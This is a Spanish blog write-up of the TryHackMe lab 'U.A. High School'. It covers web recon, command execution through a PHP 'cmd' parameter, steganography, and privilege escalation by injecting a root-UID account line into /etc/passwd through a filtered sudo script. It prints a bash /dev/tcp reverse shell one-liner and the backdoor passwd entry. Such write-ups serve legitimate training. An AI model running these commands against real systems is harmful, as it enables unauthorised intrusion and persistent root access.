---
title: U.A. High School 
layout: post
image: 
    path: /assets/covers/tryhackme.png
autor: AreiaNight
tags: [auacademy, writeup, tryhackme]
category: Pentesting
---
## INFORMACIÓN SOBRE LA MÁQUINA
- **Nombre:** U.A. High School
- **OS:** Linux
- **Flag:** Dos
- **Objetivo:** Conseguir user flag y root flag
- **Dificultad:** ¿Fácil? (Dudable)
- **Conocimientos usados:** Reconocimiento web, enumeración, cracking, desencriptación. 

## U.A. High School

Primera máquina de try hack me, así es, después de mucho lío para poder hacer funcionar el vpn y demás, al fin podré hacer una de estas. Decidí hacer la U.A. High School, por lo que en vez de lanzar un netdiscover ya que no estamos a nivel local, directamente vamos a ver la página mientras en nmap hace su trabajo. La página no es nada especial, el wappalazer tampoco nos da mucha información, así que por ahora solo queda espera a ver que nos dice el nmpa. 

![](/assets/post/Academy/1.png)

El nmap tampoco me mostró nada muy interesante más allá que los típicos puertos abiertos para la página web, el 80 y el 22. Al intentar conectarme en el ssh descubrí que existe el usuario root (así me logueó de forma automática), así que al menos ahora sé que existe ese usuario. Ahora queda hacer la enumeración.

![](/assets/post/Academy/2.png)

Después de muchas enumeraciones y buscar el nombre para la ip para colocarla en mi hosts, me percaté de que tenemos un index.php junto con varias cositas del apache que se está usando en la página. Así que posiblemente podamos usar eso de alguna forma con php. A veces con php puedes usarlo para mandar comandos de forma remota, así que vamos a intentarlo con eso

![](/assets/post/Academy/3.png)

Hay varias cosas para hacer esto, sin embargo saben que a mi me encanta usar curl, así que vamos a usar esta estructura de curl. Para los newbies vamos a explicar brevemente para que sirve mi querido y amado curl. El curl sirve para transferir datos usando a determinadas páginas usando una gran variedad de protocolos. Aquí se usó el -s para silence mode, por lo que solo nos mostrará el resultado.

```
curl -s 'http://10.10.27.77/assets/index.php?cmd=id'
```
![](/assets/post/Academy/4.png)

Lo que nos dio un hash en base 64, ¿cómo lo sé? Porque lo busqué (equis de). Hay varias formas para poder desencriptar esto, la primera es usando una página web como unhased o similar, sin embargo al ser en base 64 podemos hacer algo más interesante. 

```
curl -s 'http://10.10.27.77/assets/index.php?cmd=id' > cript.txt; cat cript.txt | base64 -d
```

Con este pequeño comando podemos mandar directamente el stdout a cript.txt, luego leerlo con cat y  al ser un código base 64 que se decodifique ahorrándonos bastante tiempo de estar descifrando y mandando comandos. Razones por las cuales prefiero estar en consola que en web es esto. Ahora, con nuestro proceso automatizado, podemos empezar a explorar. 

![](/assets/post/Academy/6.png)

Vale, tenemos unos cuantos problemitas. Por lo que veo no puede detectar algunso comandos con especio, quizá podemos saltarlo con un poco de urlcode para ver sí así podemos pasar algunas cosas. Por otra partte, podemos ver que estamos en el directorio var y solo hay tres archivos aquí: images, index.php (que es el que estamos usando) y styles.css que fue el que vimos en la enumeración.  

![](/assets/post/Academy/7.png)

Y mira tú, funcionó con ua.thm y en urlcode (que ahortia no se ve porque lo leyó como un espacio). Al momento de listar con mi curl pude ver que en efecto se había creado la carpeta, lo que me dice que tenemos privilegios en esa carpeta para escribir. Ahora hay que ver como nos mandamos una consola interactiva. Hay varias formas de mandarla, entre esas mandar un bash-i>&/dev/tcp/IP/PORT>&1. Intenté con esto directamente, pero no funcionó, así que pensé que podríamos subir un script para hacerlo de forma automática, para eso primeros debemos ver si podemos transferirnos archivos y podemos hacer esto montano un pequeño server en python para transferir cositas. 

![](/assets/post/Academy/8.png)

Y se logró, aquí tengo dos opciones: La primera es con un script que hice llamado shell.sh que es fácil, simplemente ejecuta el siguiente comando para mandar una shell. El segundo es un script que encontré hecho por este amable sujeto que permite mandar una shell, eso sí, debes cambiar la ip de la shell a la tuya junto con el puerto que quieres usar. 

```
bash-i>&/dev/tcp/IP/PORT>&1
```

El primer método no funcionó por falta de permisos, sin embargo el segundo funcionó de maravilla y ¡listo! ¡Tenemos una shell dentro de la máquina que queremos vulnerar! 

![](/assets/post/Academy/9.png)

Bueno, ahora queda hacer la escala de privilegios. Para eso tengo unas ideas, una de ellas algo más manual y la otra más automática. Primero intentaré la manual para practicar un poco y si no se puede, les traeré la que si funcione. Después de intentar algunas cosas, por falta de permisos no se podía hacer mucho, más que nada porque no podía acceder a nada que pudiese ejecutar como usuario privilegiado. Así que tocará explotar el karnel. En este caso un 5.4.0, por lo tanto usaré este exploit para poder acender mis privilegios, para eso usaré el mismo server que monté para transferir el archivo php. 

![](/assets/post/Academy/10.png)

Mientras indagaba en los directorios, encontré un file llamado passphrase.txt que pude abrir, para mi sorpresa tenía otro file en base64 que al descifrarlo decía "AllmightForEver!!!". En ese momento recordé que cuando estaba en el directorio de home, un usuario se llamaba"deku" y en este momento es dónde mis dos última neuronas cerebrales otakos se juntan y dice: "¿Será...? Nah, no puede ser.... ¿O sí?" Así que vamos a intentar conectarnos por ssh a ver que pasa. 

Después de MUCHAS horas leyendo y documentándome, resulta ser que la máquina no es tan "easy" como el titulo dice. Vamos por pasos, ¿recuerdan que les dije que había encontrado un hash base64 que decía passphrase.txt? Bueno, resulta que existen formas para "ocultar" cosas dentro de files ya sean imágenes o demás y ese es este caso en específico en una imagen que encontré en la carpeta de assets. Para resolver eso primero vamos a hacer uso de steghide y xxd. 

Kudos a esta [persona](https://0xb0b.gitbook.io/writeups/tryhackme/2024/u.a.-high-school ) y su writeup que me guío bastante con este paso, pues he tenido que analizar anteriormente archivos de red, pero jamás algo como esto. Siempre se aprende algo nuevo. 

Primero intentamos usar steghide con la imagen, entonces nos pide una frase y es aquí donde usamos el AllmightForEver!!! que habíamos encontrado anteriormente. Sin embargo, al parecer el archivo no puede ser leído correctamente por steghide, así que ahora es donde entra el xxd que nos permitirá ver los bytes de los que está conformado la imagen y no solo eso, sino también su código en hexa. Aquí es dónde las cosas se ponen algo más interesante, pues vemos que hay algo ahí. 

![](/assets/post/Academy/11.png)

Vemos que nos dice que la imagen es png para empezar además de tener una sección que podríamos decir está rota. Ahora tendremos que repararlo, para eso hexaeditor o en mi caso, simplemente usaré una página llamada https://hexed.it ya que por alguna extraña razón mi arch no quiere instalar el exaeditor, además de que así me ahorro algo de espacio con todas las cosas que tengo en mi arch. Para arreglarlo, debemos hacer que la cabecera sea la correcta al tipo de archivo que estamos usando o queremos que en este caso es jpg. Una vez listo podemos ver esta bonita imagen de Deku.  

![](/assets/post/Academy/12.png)

Ahora ya podemos usar el steghide y usando el AllmightForEver!!! para acceder a éste tenemos finalmente la contraseña de deku. De nuevo, gracias al joven que hizo la write up de esta parte, porque de lo contrario estaría totalmente perdida. Ahora sí, vamos a intentar conectarnos mediante ssh para ver si podemos acceder a deku y ahora sí hacer la escalada de privilegios adecuado. 

![](/assets/post/Academy/13.png)

¡Y lo conseguimos! Acceso a la cuenta de Deku. Ahora sí solo es cuestión de subir a root y listo, para esto hay varias formas como ya había dicho antes, pero primero vamos a enumerar la máquina para ver con qué nos estamos enfrentando, para eso usaré un script llamado les.sh que nos hace esto de forma automática. De los que vemos este, el sudo Baron Samedit fue el que más me llamó la atención, así que vamos a investigar un poco para ver como podemos subir a root. 

![](/assets/post/Academy/14.png)

Si bien el sudo que tiene la máquina es vulnerable, no podemos hacer uso de exploits de nuevo por cuestiones de permisos y que no podemos instalar herramientas (¿no qué era fácil? Try Hack Me me engañó sabroso). Por ende, ahora hay que recurrir a buscar qué cosas podemos hacer como sudo, en esto encontré un scirpt en bash llamado feedback.sh, lo primero que hice fue lanzar un cat para ver qué hacía o qué tenía adentro. Ahora sí, momento nerd de mi parte porque si se pasan por mi github se hará notorio lo mucho que me gusta el bash. 

El script es simple, un simple formulario de feedback, sin embargo lo primero que me llamó la atención fueron las condicionales que existen para poder ingresar el feedback. Para que $feedback pueda ser mandada a /ver/log/feedback.txt no debe tener las siguientes cadenas de carácteres: `"\, ")", "\$(", $(, "|", "&", ";", "?", "!", "\\"` si notan, todos o casi todos tienen un * al inicio o al final, esto quiere decir que cualquier cosa que esté adelante o detrás de dichos símbolos no podrá ser mandado y marcará un error, esto para evitar la inyección de comandos. SIN EMBARGO. Podemos ver que hay ciertos carácteres que falta, entre ellos el  > y el / en solitario. Así que podemos hacer algo por allí. 

![](/assets/post/Academy/15.png)

Primero me fui a /tmp porque ahí puedo hacer mi chiquero sin mucho problema y creé un file llamado data.test donde metí un texto, después de regresé de nuevo a dónde está el script y ahí ingresé lo siguiente:

```
echo "or I wasn't" >> /tmp/data.test
```

Y me di en enviar, me mandó un mensaje positivo de que se había mandado correctamente. Una vez eso hecho, me regresé de nuevo a /tmp y para mi sorpresa ahí está lo que había mandado a escribir, notamos que quitó las comillas y mantuvo el echo, sin embargo eso significa que podemos mandar cadenas de texto por lo que tenemos un permiso de escritura a un nivel más elevado.  

![](/assets/post/Academy/16.png)

Mientras investigaba como hacer la escala de privilegios me topé con una forma de hacerlo con las tareas crons, tareas automatizadas que son ejecutadas. Así que me fui para allá y descubrí que todas son ejecutadas por root, por lo que quizá agregando una tarea ahí podamos conseguir la flag.

![](/assets/post/Academy/18.png)

Ahora, regresando a /opt, vamos a intentar agregar una tarea crome para tratar de darnos algunos privilegios. Para eso, vamos a hacer que que nos de permisos para leer su home. Sin embargo al intentar me di con la sorpresa de que no podemos tocar las tareas cron, así que eso queda descartado, hora de investigar un poco más para ver como podemos subir privilegios. 

> Nota de la Areia del futuro: Al final de cuentas, fue error mío por no poner el sudo en el echo que había mandado anets. Ni modos, cosas que uno se da cuenta después de hacer todo.

![](/assets/post/Academy/19.png)

Después de mucha investigación, gracias a https://book.hacktricks.xyz/linux-hardening/privilege-escalation, descubrí que quizá podemos crear un usuario que podamos meter como root o al menos con privilegios elevados. Primero debemos crear una contraseña con `mkpasswd -m md5crypt -s` que en mi caso será afrodita, de ahí lo ponemos en el formato que está en el passwd. 
`areianight:$1$iCrPYJ4k$v8C/T26yt6hCdMsCTN8FN0:0:0:areianight:/root:/bin/bash /etc/passwd` y por último solo lo mandamos. Recuerden usar el sudo antes de ejecutar el script o de lo contrario no podrán escribir.  De ahí simplemente debemos mandarlo y ¡listo! ¡Tenemos una cuenta root y acceso al home de éste para tomar la bandera! 

![](/assets/post/Academy/20.png)
